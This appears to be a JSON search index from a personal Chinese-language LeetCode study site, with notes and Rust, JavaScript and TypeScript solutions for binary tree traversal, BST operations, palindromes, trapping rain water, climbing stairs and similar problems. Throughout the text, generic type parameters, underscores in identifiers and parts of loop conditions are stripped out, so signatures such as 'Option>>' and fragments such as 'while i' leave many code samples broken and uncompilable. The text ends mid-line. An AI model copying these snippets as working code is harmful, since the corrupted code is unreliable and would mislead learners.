source:\n\n二叉树的层次遍历，其实和构建二叉树是一样的，而且更简单。dfs和bfs都可以，但是感觉用bfs会更加自然。\n\n如果是从bottom开始，只要reverse一下从top开始的结果就可以。\n\npub fn level_order(root: Option>>) -> Vec> {\n    use std::collections::VecDeque;\n\n    let mut ret = vec![];\n    if root.is_none() {\n        return ret;\n    }\n\n    let mut queue = VecDeque::>>>::new();\n    queue.push_front(root);\n    while !queue.is_empty() {\n        let num = queue.len() as i32;\n        let mut level_arr = vec![];\n        let mut i = 0;\n        while i\n\npreorder: 根在前，从左往右，一棵树的根永远在左子树前面，左子树又永远在右子树前面\n\n栈符合前序遍历的要求，先进后出，深度到底。\n\n值得一提的是，如果不用函数栈，即递归的形式，那么可以自己构造栈，把右节点先入栈，左边一口气到底, 个人感觉虽然比递归代码量大，但是更加的直观。\n\npub fn preorder_traversal(root: Option>>) -> Vec {\n  let mut ret = vec![];\n  let mut stack = vec![root];\n  while let Some(node) = stack.pop() {\n    if let Some(n) = node {\n      let borrownode = n.borrowmut();\n      ret.push(borrow_node.val);\n      stack.push(borrow_node.right.clone());\n      stack.push(borrow_node.left.clone());\n    }\n  }\n  return ret;\n}\n\ninorde\n\nNo.94, source:\n\ninorder: 根在中，从左往右，一棵树的左子树永远在根前面，根永远在右子树前面.\n\n递归实现比较简单，比较难的是用自己用栈结构实现。\n\n思路是对于一个节点而言，要先把所有的左节点都入栈，然后在出栈的过程中，收集值然后再把右节点入栈。\n\npub fn inorder_traversal(root: Option>>) -> Vec {\n  let mut ret = vec![];\n  let mut stack = vec![];\n  let mut currentrootwrap = root;\n\n  while currentrootwrap.issome() || !stack.isempty() {\n    while let Some(node) = currentrootwrap {\n      currentrootwrap = node.borrow().left.clone();\n      stack.push(node);\n    }\n    if let Some(node) = stack.pop() {\n      ret.push(node.borrow().val);\n      currentrootwrap = node.borrow().right.clone();\n    }\n  }\n\n  return ret;\n}\n\npostorder\n\nNo. 145, source:\n\npostorder: 根在后，从左往右，一棵树的左子树永远在右子树前面，右子树永远在根前面.\n\n值得一提的是，前序稍微改一下然后reverse，就是后序：\n\n前序：中 -> 左 -> 右\n稍微改一下前序顺序: 中 -> 右 -> 左\n然后翻转: 左 -> 右 -> 中\n\n用栈结构实现是前中后最难的：左节点一撸到底，然后去检查右节点，每个节点处理完就值为空，当右节点也不存在时，就可以把此时的节点值推入。\n\npub fn postorder_traversal(root: Option>>) -> Vec {\n    let mut ret = vec![];\n    let mut stack = vec![];\n    let mut currentrootwrap = root;\n\n    while currentrootwrap.issome() || !stack.isempty() {\n        while let Some(node) = currentrootwrap {\n            currentrootwrap = node.borrow_mut().left.take();\n            stack.push(node);\n        }\n        if let Some(node) = stack.pop() {\n            if node.borrow().right.is_some() {\n                currentrootwrap = node.borrow_mut().right.take();\n                stack.push(node);\n            } else {\n                ret.push(node.borrow().val);\n            }\n        }\n    }\n    ret\n}\n\nzigzag level order\n\nNo.103, source:\n\n其实是层序遍历的变种，只要每行reverse数组即可。\n\npub fn zigzaglevelorder(root: Option>>) -> Vec> {\n    use std::collections::VecDeque;\n\n    let mut ret = vec![];\n    if root.is_none() {\n        return ret;\n    }\n    let mut queue = VecDeque::>>>::new();\n    queue.push_front(root);\n    let mut current_level = 0;\n    while !queue.is_empty() {\n        let num = queue.len() as i32;\n        let mut level_arr = vec![];\n        let mut i = 0;\n        while i\n\n记录下各节点坐标，然后进行数组遍历，算出结果。这题的特性，用dfs去做会更加的简便。\n\n    let mut node_coordinate: Vec = Vec::new();\n    let mut ans: Vec> = Vec::new();\n    let mut last_col = i32::MIN;\n\n    fn dfs(\n        root: Option>>>,\n        (row, col): (i32, i32),\n        node_coordinate: &mut Vec,\n    ) {\n        let left = root.asref().unwrap().borrowmut().left.take();\n        let right = root.asref().unwrap().borrowmut().right.take();\n        let value = root.as_ref().unwrap().borrow().val;\n\n        node_coordinate.push((row, col, value));\n        if left.is_some() {\n            dfs(left, (row + 1, col - 1), node_coordinate);\n        }\n        if right.is_some() {\n            dfs(right, (row + 1, col + 1), node_coordinate);\n        }\n    }\n    dfs(root, (0, 0), &mut node_coordinate);\n    nodecoordinate.sortunstable_by(|a, b| {\n        if a.1 != b.1 {\n            a.1.cmp(&b.1)\n        } else if a.0 != b.0 {\n            a.0.cmp(&b.0)\n        } else {\n            a.2.cmp(&b.2)\n        }\n    });\n\n    for (row, col, val) in nodecoordinate {\n        if last_col != col {\n            ans.push(Vec::new());\n            last_col = col;\n        }\n        ans.last_mut().unwrap().push(val);\n    }\n\n    ans\n\n总结\n","title":"Binary Tree Traverse Collection"},"95&96.unique-binary-search-trees.html":{"content":"96. Unique Binary Search Trees\n\nsource:\n\nQuestion\n\nGiven an integer n, return the number of structurally unique BST's (binary search trees) which has exactly n nodes of unique values from 1 to n.\n\n初想法\n\npub fn num_trees(n: i32) -> i32 {\n\n}\n\n总结\n","title":"96. Unique Binary Search Trees"},"98.validate-binary-search-tree.html":{"content":"98. Validate Binary Search Tree\n\nsource:\n\nQuestion\n\nGiven the root of a binary tree, determine if it is a valid binary search tree (BST).\n\nA valid BST is defined as follows:\n\nThe left subtree of a node contains only nodes with keys less than the node's key.\nThe right subtree of a node contains only nodes with keys greater than the node's key.\nBoth the left and right subtrees must also be binary search trees.\n\n初想法\n\n这题的第一想法就是用dfs去做，因为这题在遍历的过程中，和父节点的关系非常明显：\n\n父节点是所有左子节点的最大值\n父节点是所有右子节点的最小值\n\n这题过程中最浪费我时间的是： 如何保证子节点和父节点之间值的正确比较？\n\n多画图的话，思路会明显清晰一些：\n\npub fn vertical_traversal(root: Option>>) -> bool {\n    if root.is_none() {\n        return true;\n    }\n    fn dfs(\n        node: Option>>,\n        min_val: i32,\n        max_val: i32,\n        valid: bool,\n        is_root: bool,\n        is_min: bool,\n        is_max: bool,\n    ) -> bool {\n        if valid == false {\n            return valid;\n        }\n        if let Some(unwrapped_node) = node {\n            let left = unwrappednode.borrowmut().left.take();\n            let right = unwrappednode.borrowmut().right.take();\n            let value = unwrapped_node.borrow().val;\n            if !isroot && (!ismin && value = max_val)\n                || !dfs(left, minval, value, valid, false, ismin, false)\n                || !dfs(right, value, maxval, valid, false, false, ismax)\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    return dfs(root, i32::MIN, i32::MAX, true, true, true, true);\n}\n\n总结\n\nBST题目中有不同的特性，要合理的选择遍历方法，基础的其实就只有dfs和bfs，抓住这两者之间的特点就好了。\n\n同时注意和父子节点的关系，和极值时候的情况。\n","title":"98. Validate Binary Search Tree"},"105&106.construct-binary-tree-from-preorder-and-inorder-traversal.html":{"content":"105 & 106\n\n105. Construct Binary Tree from Preorder and Inorder Traversal\n\nsource:\n\nQuestion\n\nGiven two integer arrays preorder and inorder where preorder is the preorder traversal of a binary tree and inorder is the inorder traversal of the same tree, construct and return the binary tree.\n\n思路\n\n这道题其实没啥初想法，拿到手了以后一脸蒙蔽。唯一的念头就是是否能把这两个数组转换为层序遍历的形式，然后用类似297题的思路去解。但是没有一个明确的思路。\n\n后来看了labuladong的这篇文章： ，感觉讲解的很好。主要的思路还是要去分析这两种遍历模式之间的区别。\n\n实际的解题书写过程中，要特别注意熟练掌握index和length之间的关系，不然很容易写错，最好把图都画出来。\n\npub fn build_tree(preorder: Vec, inorder: Vec) -> Option>> {\n    if preorder.is_empty() {\n        return None;\n    }\n    fn build(\n        i1: usize,\n        i2: usize,\n        i3: usize,\n        i4: usize,\n        preorder: &Vec,\n        inorder: &Vec,\n    ) -> Option>> {\n        if i1 > i2 {\n            return None;\n        }\n        let root_val = preorder[i1];\n        let mut index = 0;\n        for (i, v) in inorder.iter().enumerate() {\n            if *v == root_val {\n                index = i;\n                break;\n            }\n        }\n        let left_size = index - i3;\n        let mut root = TreeNode::new(root_val);\n        root.left = build(i1 + 1, i1 + left_size, i3, index - 1, preorder, inorder);\n        root.right = build(i1 + left_size + 1, i2, index + 1, i4, preorder, inorder);\n        return Some(Rc::new(RefCell::new(root)));\n    }\n    let end_index = preorder.len() - 1;\n    build(0, endindex, 0, endindex, &preorder, &inorder)\n}\n\n106. Construct Binary Tree from Inorder and Postorder Traversal\n\nsource:\n\nQuestion\n\nGiven two integer arrays inorder and postorder where inorder is the inorder traversal of a binary tree and postorder is the postorder traversal of the same tree, construct and return the binary tree.\n\n初想法\n\n有了105题的经验，这题的思路很明显也会往dfs的方向去思考。\n\npub fn build_tree(inorder: Vec, postorder: Vec) -> Option>> {\n    if inorder.is_empty() {\n        return None;\n    }\n    fn build(\n        i1: i32,\n        i2: i32,\n        i3: i32,\n        i4: i32,\n        inorder: &Vec,\n        postorder: &Vec,\n    ) -> Option>> {\n        if i1 > i2 {\n            return None;\n        }\n        let root_val = postorder[i2 as usize];\n        let mut index: i32 = 0;\n        for (i, v) in inorder.iter().enumerate() {\n            if *v == root_val {\n                index = i as i32;\n                break;\n            }\n        }\n        let left_size = index as i32 - i3;\n        let mut root = TreeNode::new(root_val);\n        println!(\"i1:{},i2:{},leftsize:{}\", i1, i2, leftsize);\n        root.left = build(i1, i1 + left_size - 1, i3, index - 1, inorder, postorder);\n        root.right = build(i1 + left_size, i2 - 1, index + 1, i4, inorder, postorder);\n        return Some(Rc::new(RefCell::new(root)));\n    }\n    let end_index = inorder.len() as i32 - 1;\n    build(0, endindex, 0, endindex, &inorder, &postorder)\n}\n\n把图画出来就会很好做：\n\n特别要注意一点，index的运算要用i32，因为在退出条件时index参数可能为负数，如果用usize，运算符溢出就会导致退出条件失效。\n\n总结\n\n这种题很明显要先熟悉前、中、后这种常见的遍历，然后在他们之中找规律，完成解题。\n\n同时注意基本功的积累。\n","title":"105 & 106"},"112.path-sum.html":{"content":"112. Path Sum\n\nsource:\n\nQuestion\n\nGiven the root of a binary tree and an integer targetSum, return true if the tree has a root-to-leaf path such that adding up all the values along the path equals targetSum.\n\nA leaf is a node with no children.\n\n思路\n\n主要还是带着参数去traverse二叉树，属于比较常规的基础题。\n\npub fn haspathsum(root: Option>>, target_sum: i32) -> bool {\n  fn dfs(node: Option>>>, sum: i32, target: i32) -> bool {\n    if let Some(node) = node {\n      let mut node = node.borrow_mut();\n      if node.left.isnone() && node.right.isnone() && sum + node.val == target || dfs(node.left.take(), sum + node.val, target) || dfs(node.right.take(), sum + node.val, target) {\n        return true;\n      }\n    }\n    false\n  }\n  dfs(root, 0, target_sum)\n}\n\nEnd\n\n掌握好traverse基础，这题就很easy。\n","title":"112. Path Sum"},"114.flatten-binary-tree-to-linked-list.html":{"content":"114. Flatten Binary Tree to Linked List\n\nsource:\n\nQuestion\n\nGiven the root of a binary tree, flatten the tree into a \"linked list\":\n\nThe \"linked list\" should use the same TreeNode class where the right child pointer points to the next node in the list and the left child pointer is always null.\nThe \"linked list\" should be in the same order as a pre-order traversal of the binary tree.\n\n初想法\n\n这题基于114，就可以很容易的做出来。\n\n值得注意的是直接node会更容易去遍历构造链表。\n\npub fn flatten(root: &mut Option>>) {\n    if root.is_none() {\n        return;\n    }\n    fn preordertraversaltraverse(\n        root: &mut Option>>,\n    ) -> Vec>> {\n        let mut ret = vec![];\n        let mut stack = vec![root.clone()];\n        while let Some(node) = stack.pop() {\n            if let Some(node) = node {\n                ret.push(node.clone());\n                stack.push(node.borrow_mut().right.take());\n                stack.push(node.borrow_mut().left.take());\n            }\n        }\n        ret\n    }\n    let mut list = preordertraversaltraverse(root);\n    list.reverse();\n    while let Some(node) = list.pop() {\n        if list.len() != 0 {\n            node.borrow_mut().right = Some(list.get(list.len() - 1).unwrap().clone());\n        }\n    }\n}\n\n总结\n\n注意熟练掌握各种基础遍历，对于这种题目就会得心应手。","title":"114. Flatten Binary Tree to Linked List"},"116&117.populating-next-right-pointers-in-each-node.html":{"content":"116&117. Populating Next Right Pointers in Each Node I && II\n\nsource:\nsource:\n\nQuestion\n\nYou are given a (perfect) binary tree where all leaves are on the same level, and every parent has two children. The binary tree has the following definition:\n\nstruct Node {\n  int val;\n  Node *left;\n  Node *right;\n  Node *next;\n}\n\nPopulate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL.\n\nInitially, all next pointers are set to NULL.\n\n初想法\n\n116和117唯一的区别就是是否是完美二叉树，但其实如果用bfs来做的话是没有区别的。\n\n这题的核心关系是相同层级间节点的关系，所以是很典型的有层级的bfs发挥的场景。如果用层级遍历的方式做就非常简单。\n\nvar connect = function (root) {\n    if (!root) return root;\n    const list = [];\n    const queue = [root];\n    while (queue.length) {\n        const num = queue.length;\n        const sub = [];\n        let i = 0;\n        while (i  sub.forEach((node, index) => {\n        node.next = sub[index + 1] || null;\n    }));\n    return root;\n};\n\n总结\n\n其实很多题目间是进阶关系，熟练掌握了层级遍历(102), 本题就非常简单。","title":"116&117. Populating Next Right Pointers in Each Node I && II"},"236.lowest-common-ancestor-of-a-binary-tree.html":{"content":"236. Lowest Common Ancestor of a Binary Tree\n\nsource:\n\nQuestion\n\nGiven a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.\n\nAccording to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).”\n\n初想法\n\n第一想法是每个节点都持有一个不同引用地址的数组，这个数组含有此节点的所有父节点。\n\n这个想法的问题是每次递归都要新建一个数组，空间复杂度O(n2), 导致会OOM.\n\n var lowestCommonAncestor = function(root, p, q) {\n    let pParents;\n    let qParents;\n    const dfs = (node, list, parents) => {\n        if (node) {\n            list.push(node);\n            parents.push(node);\n            if (node === p) pParents = parents;\n            if (node === q) qParents = parents;\n            if (list.includes(p) && list.includes(q)) {\n                return null\n            }\n            return dfs(node.left, list, [...parents]) || dfs(node.right, list, [...parents]);\n        }\n    };\n    return dfs(root, [], []);\n};\n\n改进\n\n分别从左右节点找目标子节点：\n\n如果两个子节点都找到了，那么自身肯定是他们的公共父节点\n如果只找到了一边的节点，说明两个目标子节点都在这一边，直接选取自身作为公共父节点\n\nvar lowestCommonAncestor = function(root, p, q) {\n    const dfs = node => {\n        if (!node || node === p || node === q) return node;\n        const left = dfs(node.left);\n        const right = dfs(node.right);\n        return left && right ? node : left || right;\n    };\n    return dfs(root);\n};\n\npub fn lowestcommonancestor(\n    root: Option>>,\n    p: Option>>,\n    q: Option>>,\n) -> Option>> {\n    fn dfs(\n        node: Option>>,\n        p_val: i32,\n        q_val: i32,\n    ) -> Option>> {\n        if let Some(x) = node {\n            if x.borrow().val == pval || x.borrow().val == qval {\n                return Some(Rc::clone(&x));\n            }\n            let left = dfs(x.borrowmut().left.take(), pval, q_val);\n            let right = dfs(x.borrowmut().right.take(), pval, q_val);\n            if left.is_none() {\n                right\n            } else if right.is_none() {\n                left\n            } else {\n                Some(Rc::clone(&x))\n            }\n        } else {\n            None\n        }\n    }\n    dfs(root, p.unwrap().borrow().val, q.unwrap().borrow().val)\n}\n\n并查集\n\n总结\n\n这题其实并不难，第一反应用dfs也是没问题的，但是对于如何确定公共子节点block住了。\n\n每道bst的题目除了通用的search部分，也要抓住他们核心的逻辑实现部分。\n","title":"236. Lowest Common Ancestor of a Binary Tree"},"1448.count-good-nodes-in-binary-tree.html":{"content":"1448. Count Good Nodes in Binary Tree\n\nsource:\n\nQuestion\n\nGiven a binary tree root, a node X in the tree is named good if in the path from root to X there are no nodes with a value greater than X.\n\nReturn the number of good nodes in the binary tree.\n\n初想法\n\n这道题还是思路比较明确的，和父节点关系明显，用dfs去做最方便。\n\n值得一提的是，这道题一开始我希望在dfs函数里直接传递i32的结果，但是发现很难计算，不如直接传一个可以share的引用对象数组，最后算他的长度。\n\npub fn good_nodes(root: Option>>>) -> i32 {\n    if root.is_none() {\n        return 0;\n    }\n    fn dfs(node: Option>>, ret: &mut Vec, max: i32) {\n        if let Some(unwrapped_node) = node {\n            let left = unwrappednode.borrowmut().left.take();\n            let right = unwrappednode.borrowmut().right.take();\n            let value = unwrapped_node.borrow().val;\n            let good_node = value >= max;\n            if good_node {\n                ret.push(0);\n            }\n            dfs(left, ret, if good_node { value } else { max });\n            dfs(right, ret, if good_node { value } else { max });\n        }\n    }\n    let mut ret = vec![];\n    dfs(root, &mut ret, i32::MIN);\n    ret.len() as i32\n}\n\n总结\n\n在遍历过程中，如果有需要统计的值，最好用引用对象去传递。\n","title":"1448. Count Good Nodes in Binary Tree"},"230&538&1038.kth-smallest-element-in-a-bst.html":{"content":"BST inorder traverse\n\n对于一个BST，参考98题给出的定义：\n\n节点的左子树只包含小于当前节点的数。\n节点的右子树只包含大于当前节点的数。\n所有左子树和右子树自身必须也是二叉搜索树\n\n直接基于 BST 的数据结构有 AVL 树，红黑树等等，拥有了自平衡性质，可以提供 logN 级别的增删查改效率；还有 B+ 树，线段树等结构都是基于 BST 的思想来设计的。\n\n从做算法题的角度来看 BST，除了它的定义，还有一个重要的性质：BST 的中序遍历结果是有序的（升序）。\n\n中序遍历一个bst的基本范式如下：\n\nfunction traverse(root) {\n    if (root == null) return;\n    traverse(root.left);\n    // do something\n    callback(root.val);\n    traverse(root.right);\n}\n\n典型的题目如下：\n\n230. Kth Smallest Element in a BST\n\nsource:\n\nQuestion\n\nGiven the root of a binary search tree, and an integer k, return the kth smallest value (1-indexed) of all the values of the nodes in the tree.\n\n思路\n\n中序遍历, 然后数组找出index=k-1的元素。\n\npub fn kth_smallest(root: Option>>, k: i32) -> i32 {\n    if root.is_none() {\n        return k;\n    }\n    fn dfs(root: Option>>>, ret: &mut Vec) {\n        if let Some(root) = root {\n            let left = root.borrow_mut().left.take();\n            let right = root.borrow_mut().right.take();\n            dfs(left, ret);\n            ret.push(root.borrow().val);\n            dfs(right, ret);\n        }\n    }\n    let mut list = vec![];\n    dfs(root, &mut list);\n    *list.get(k as usize - 1).unwrap()\n}\n\n538. Convert BST to Greater Tree\n\nsource:\n\nQuestion\n\nGiven the root of a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus the sum of all keys greater than the original key in BST.\n\n思路\n\n中序遍历后等于排序，列表里推入node，然后把node的值改为累加值\n\npub fn convert_bst(root: Option>>) -> Option>> {\n    if root.is_none() {\n        return root;\n    }\n    fn dfs(root: &Option>>, ret: &mut Vec>>) {\n        if let Some(root) = root {\n            let left = root.borrow_mut().left.clone();\n            let right = root.borrow_mut().right.clone();\n            dfs(&left, ret);\n            ret.push(root.clone());\n            dfs(&right, ret);\n        }\n    }\n    let mut list = vec![];\n    dfs(&root, &mut list);\n    let mut acc = 0;\n    while let Some(node) = list.pop() {\n        let val = node.borrow_mut().val;\n        node.borrow_mut().val = acc + val;\n        acc += val;\n    }\n    root\n}\n\n1038. Binary Search Tree to Greater Sum Tree\n\nsource:\n\nQuestion\n\nGiven the root of a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus the sum of all keys greater than the original key in BST.\n\n思路\n\n还是根据BST的中序遍历是从小到大的顺序，替换掉val值。\n\npub fn bsttogst(root: Option>>) -> Option>> {\n    if root.is_none() {\n        return root;\n    }\n    fn dfs(root: &Option>>, ret: &mut Vec>>) {\n        if let Some(root) = root {\n            let left = root.borrow_mut().left.clone();\n            let right = root.borrow_mut().right.clone();\n            dfs(&left, ret);\n            ret.push(root.clone());\n            dfs(&right, ret);\n        }\n    }\n    let mut list = vec![];\n    dfs(&root, &mut list);\n    let mut sum = 0;\n    while let Some(node) = list.pop() {\n        let val = node.borrow_mut().val;\n        sum += val;\n        node.borrow_mut().val = sum;\n    }\n    root\n}\n\n总结\n\nBST的中序是很有用且很特殊的性质，很多题目基于此，熟练掌握他的中序遍历及其应用。\n","title":"BST inorder traverse"},"450.delete-node-in-a-bst.html":{"content":"450. Delete Node in a BST\n\nsource:\n\nQuestion\n\nGiven a root node reference of a BST and a key, delete the node with the given key in the BST. Return the root node reference (possibly updated) of the BST.\n\nBasically, the deletion can be divided into two stages:\n\nSearch for a node to remove.\nIf the node is found, delete the node.\n\n思路\n\n这道题拿到手上之后，我的第一反应是去用traverse的模版去做，类似：\n\nfunction traverse(root) {\n    if (root == null) return;\n    traverse(root.left);\n    // do something\n    callback(root.val);\n    traverse(root.right);\n}\n\n这么做其实也是可以做出来的，但是会更加的复杂，因为要去考虑父节点和子节点之间的关系。更好的办法是去用修改的bst模版去做：\n\nfunction operate(root) {\n  if (root == null) return null;\n  root.left = operate(root.left);\n  root.right = operate(root.right);\n  return root;\n}\n\n这种范式是有返回值的，优点是可以仅考虑本节点的情况。\n\n本题中，对于本节点的操作有这么几种可能性：\n\n恰好是末端节点，两个子节点都为空，直接删掉就行\n只有一个非空子节点。如果是左节点，用左节点中的最大节点替换；如果是右节点，用右节点中的最小节点替换\n有两个非空子节点，用只有一个非空子节点其中的一种情况来处理即可\n\nuse std::rc::Rc;\nuse std::cell::RefCell;\nimpl Solution {\n  /**\n   找到本节点下的最左节点\n   - 在BST下即为最小节点\n   */\n  fn node_min(root: &Option>>) -> Option>> {\n      let mut left = root.clone();\n      let mut stop = false;\n      while !stop {\n          // 这里有个前提，传进来的root一定不为空\n          let l = left.clone().unwrap().borrow_mut().left.clone();\n          if l.is_some() {\n              left = l;\n          } else {\n              stop = true;\n          }\n      }\n      left.clone()\n  }\n\n  /**\n   找到本节点下的最右节点\n   - 在BST下即为最大节点\n   */\n  fn node_max(root: &Option>>) -> Option>> {\n      let mut right = root.clone();\n      let mut stop = false;\n      while !stop {\n          // 这里有个前提，传进来的root一定不为空\n          let r = right.clone().unwrap().borrow_mut().right.clone();\n          if r.is_some() {\n              right = r;\n          } else {\n              stop = true;\n          }\n      }\n      right.clone()\n  }\n\n  pub fn delete_node(root: Option>>, key: i32) -> Option>> {\n      if let Some(n) = root.clone() {\n          let left = n.borrow_mut().left.clone();\n          let right = n.borrow_mut().right.clone();\n          let val = n.borrow().val;\n          // 如果为目标节点\n          if val == key {\n              // 恰好是末端节点，两个子节点都为空，直接删掉就行\n              if left.isnone() && right.isnone() {\n                  return None;\n              // 有右节点，用右节点中的最小节点替换\n              } else if right.is_some() {\n                  // 找出右节点中的最小节点值。此处右节点一定不为空\n                  let minval = Self::nodemin(&right).unwrap().borrow().val;\n                  // 把本节点的值替换掉\n                  n.borrowmut().val = minval;\n                  // 删去右节点中的最小节点\n                  n.borrowmut().right = Self::deletenode(right, min_val);\n              // 有左节点，用左节点中的最大节点替换\n              } else {\n                  // 找出左节点中的最大节点值。此处左节点一定不为空\n                  let maxval = Self::nodemax(&left).unwrap().borrow().val;\n                  // 把本节点的值替换掉\n                  n.borrowmut().val = maxval;\n                  // 删去左节点中的最大节点\n                  n.borrowmut().left = Self::deletenode(left, max_val);\n              }\n          // 比目标节点值大，目标节点在左节点处\n          } else if val > key {\n              n.borrowmut().left = Self::deletenode(left, key);\n          // 比目标节点值小，目标节点在右节点处\n          } else if val < key {\n              n.borrowmut().right = Self::deletenode(right, key);\n          }\n          // 返回当前节点\n          return root.clone();\n      }\n      return None;\n  }\n}\n\nEnd\n\n这一道题比预想的要不好做一点，可能是没有掌握操作节点的一点诀窍，仍然用了遍历的思路去做。\n\n对于不同的问题，要用不同的范式去做。\n","title":"450. Delete Node in a BST"},"701.insert-into-a-binary-search-tree.html":{"content":"701. Insert into a Binary Search Tree\n\nsource:\n\nQuestion\n\nYou are given the root node of a binary search tree (BST) and a value to insert into the tree. Return the root node of the BST after the insertion. It is guaranteed that the new value does not exist in the original BST.\n\nNotice that there may exist multiple valid ways for the insertion, as long as the tree remains a BST after insertion. You can return any of them.\n\n思路\n\n插入一个节点，一开始想的比较复杂。去考虑子节点的各种情况，但是如果用递归每层替换去考虑的话，一层层替换下去，最后只要考虑空子节点的情况就好。\n\npub fn insertintobst(root: Option>>, val: i32) -> Option>> {\n  if let Some(n) = root.clone() {\n    let mut n = n.borrow_mut();\n    // 比当前节点的值大\n    if val > n.val {\n      n.right = Self::insertintobst(n.right.take(), val);\n    // 比当前节点的值小\n    } else {\n      n.left = Self::insertintobst(n.left.take(), val);\n    }\n    // 返回当前节点\n    return root;\n  }\n  return Some(Rc::from(RefCell::from(TreeNode::new(val))))\n}\n\nEnd\n\n这道题写起来很简单，但是其实想通了不简单。\n\n对于操作bst来说，这题的思想还是很泛用的。\n","title":"701. Insert into a Binary Search Tree"},"5.longest-palindromic-substring.html":{"content":"5. Longest Palindromic Substring\n\nsource:\n\nQuestion\n\nGiven a string s, return the longest palindromic substring in s.\n\n动态规划\n\n/**\n dp\n @param {string} s\n @return {string}\n */\nvar longestPalindrome = function (s) {\n  let maxLen = 1,\n    start = 0;\n  const dp = Array(s.length).fill(false);\n\n  for (let l = 2; l  maxLen) {\n        maxLen = l;\n        start = i;\n      }\n    }\n  }\n\n  return s.slice(start, start + maxLen);\n};\n\n中心扩散\n\n核心是去写出palindrome：利用数组下标判断是否回文。\n\nvar longestPalindrome = function(s) {\n    const palindrome = (l, r) => {\n\t\twhile (l >= 0 && r  s1.length ? ret : s1;\n\t\tres = res.length > s2.length ? res : s2;\n\t}\n\treturn ret;\n};\n\nEnd\n\n这种题可以需要记忆一下，可以在第一时间快速写出。\n","title":"5. Longest Palindromic Substring"},"42.trapping-rain-water.html":{"content":"42. Trapping Rain Water\n\nsource:\n\nQuestion\n\nGiven n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it can trap after raining.\n\n暴力法\n\n这一道题有几个最基础的概念：\n\n某个index能接的雨水数量是其与，左右最大值之间的最小值，的差值。\n最左和最右的位置肯定是接不住的\n\nfunction trap(height: number[]): number {\n    let ret = 0;\n    const size = height.length;\n    for (let i = 1; i = 0; j--) {\n            left = Math.max(left, height[j]);\n        }\n        for (let j = i; j = 0; i--) {\n    rightMax[i] = Math.max(\n      rightMax[i + 1] === undefined ? -Infinity : rightMax[i + 1],\n      height[i]\n    );\n  }\n  for (let i = 0; i  height[left]) ret += leftMax - height[left];\n      left++;\n    } else {\n      rightMax = Math.max(rightMax, height[right]);\n      if (rightMax > height[right]) ret += rightMax - height[right];\n      right--;\n    }\n  }\n  return ret;\n};\n\n时间复杂度O(n), 空间复杂度O(1).\n\n总结\n\n先总结基础规律，然后先给出暴力算法，再一步步的寻找优化途径。\n","title":"42. Trapping Rain Water"},"70.climbing-stairs.html":{"content":"70. Climbing Stairs\n\nsource:\n\nQuestion\n\nYou are climbing a staircase. It takes n steps to reach the top.\n\nEach time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?\n\n暴力法\n\nfunction climbStairs(n: number): number {\n    const steps = [1, 2];\n    let ret = 0;\n    const climb = (lastN: number) => {\n        if (lastN === n) {\n            ret += 1;\n            return;\n        }\n        if (lastN > n) {\n            return;\n        }\n        steps.forEach(step => climb(lastN + step));\n    };\n    climb(0);\n    return ret;\n};\n\n这种解法比较简单容易想到，缺点是有很多重复计算，在leetcode上的test cases是会超时的。\n\n递归\n\n需要归纳一下规律：\n\n1. 爬1级台阶，1种方法\n2. 爬2级台阶，2种方法\n3. 爬3级台阶，是: 爬1级台阶的结果 + 爬2级台阶的结果，因为在这两种情况的基础上，+1和+2就可以得到爬3级台阶的结果\n...\nn. 爬n级台阶，f(n) = f(n - 1) + f(n - 2)\n\nfunction climbStairs(n: number): number {\n    if (n === 0) return 0;\n    if (n === 1) return 1;\n    if (n === 2) return 2;\n    return climbStairs(n - 1) + climbStairs(n - 2);\n};\n\n这种情况下还是超时，和无缓存的斐波那契数列一样，我们为他加一个缓存。\n\nfunction climbStairs(n: number): number {\n    const cache = {};\n    const calc = num => {\n        if (num === 0) return 0;\n        if (num === 1) return 1;\n        if (num === 2) return 2;\n        const a = num - 1;\n        const b = num - 2;\n        if (!cache[a]) cache[a] = calc(a);\n        if (!cache[b]) cache[b] = calc(b);\n        return cache[a] + cache[b];\n    };\n    return calc(n);\n};\n\n动态规划\n\n在缓存的基础，可以比较容易的推出dp版本，这里的dp数组，其实就充当了缓存的角色。\n\nfunction climbStairs(n: number): number {\n    const steps = [1, 2];\n    const dp = new Array(n + 1).fill(1);\n    for (let i = 2; i  acc + dp[i - crr], 0);\n    }\n    return dp[n];\n};\n\n总结\n\n这道题的核心，或者说所有dp题目的核心，还是要推出状态转变公式，这样的话无论是加缓存还是用dp，都是可以的。\n","title":"70. Climbing Stairs"},"121.best-time-to-buy-and-sell-stock.html":{"content":"121. Best Time to Buy and Sell Stock\n\nsource:\n\nQuestion\n\nYou are given an array prices where prices[i] is the price of a given stock on the ith day.\n\nYou want to maximize your profit by choosing a single day to buy one stock and choosing a different day in the future to sell that stock.\n\nReturn the maximum profit you can achieve from this transaction. If you cannot achieve any profit, return 0.\n\n思路\n\n/**\n @param {number[]} prices\n @return {number}\n */\nvar maxProfit = function (prices) {\n  let max = -Infinity;\n  let ret = 0;\n  for (let i = prices.length - 1; i >= 0; i--) {\n    const v = max - prices[i];\n    max = Math.max(max, prices[i]);\n    if (v > ret) ret = v;\n  }\n  return ret;\n};\n\n总结\n","title":"121. Best Time to Buy and Sell Stock"},"347.top-k-frequent-elements.html":{"content":"347. Top K Frequent Elements\n\nsource:\n\nQuestion\n\nGiven an integer array nums and an integer k, return the k most frequent elements. You may return the answer in any order.\n\n思路\n\n做这一题的初衷是去学习桶排序的分治思想，所以一开始就用桶排序+hash map的方式去做。\n\n桶排序的优点是可以把一组大的数据分成小的，在内存和多线程处理上就会有较大的优势。\n\nvar topKFrequent = function (nums, k) {\n  let maxCount = 0;\n  const map = {};\n  // 统计每个数字出现次数\n  nums.forEach((num) => {\n    map[num] = (map[num] || 0) + 1;\n    maxCount = Math.max(map[num], maxCount);\n  });\n  // 按出现次数为顺序，分桶\n  const buckets = [];\n  Object.keys(map).forEach((num) => {\n    const count = map[num];\n    if (!buckets[count]) buckets[count] = [];\n    buckets[count].push(num);\n  });\n  const res = [];\n  for (let i = maxCount; i >= 0; i--) {\n    if (k < 1) break;\n    if 